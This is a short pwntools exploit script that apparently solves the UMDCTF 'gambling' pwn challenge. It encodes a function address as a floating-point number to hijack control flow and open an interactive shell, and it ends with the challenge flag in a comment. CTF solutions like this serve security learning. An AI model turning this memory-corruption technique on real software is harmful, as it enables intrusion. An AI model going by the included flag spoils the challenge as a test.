from pwn import *
import struct

context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./gambling', '''
    b *(gamble+81)
    continue
''')

# p = remote('challs.umdctf.io', 31005)

hex_value = 0x080492c0 << 32
double_value = struct.unpack('<d', struct.pack('<Q', hex_value))[0]

p.recvuntil(b'Enter your lucky numbers: ')
p.sendline(f' 0 0 0 0 0 0 {double_value}'.encode())

p.interactive()

# UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}